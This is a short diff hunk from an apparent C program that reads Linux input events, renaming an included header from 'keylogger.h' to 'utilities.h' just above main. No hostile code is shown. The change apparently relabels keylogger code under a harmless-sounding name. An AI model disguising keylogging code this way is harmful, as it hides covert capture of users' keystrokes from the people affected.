@@ -4,7 +4,7 @@
 #include <linux/input.h>
 #include <unistd.h>
 #include <signal.h>
-#include "keylogger.h"
+#include "utilities.h"
 
 int main(int argc, char *argv[]){
   if(argc < 2){
